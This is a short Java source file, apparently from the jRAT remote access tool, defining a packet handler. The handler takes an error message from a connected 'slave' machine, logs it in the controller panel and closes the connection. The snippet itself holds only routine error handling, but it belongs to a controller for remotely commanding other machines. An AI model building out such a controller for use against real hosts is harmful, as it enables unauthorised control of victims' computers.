package io.jrat.controller.packets.incoming;

import io.jrat.controller.LogAction;
import io.jrat.controller.Main;
import io.jrat.controller.Slave;
import io.jrat.controller.exceptions.CloseException;
import java.io.DataInputStream;


public class Packet60Error extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		String reason = slave.readLine();

		Main.instance.getPanelLog().addEntry(LogAction.ERROR, slave, reason);

		slave.closeSocket(new CloseException("Error packet: " + reason));
	}

}
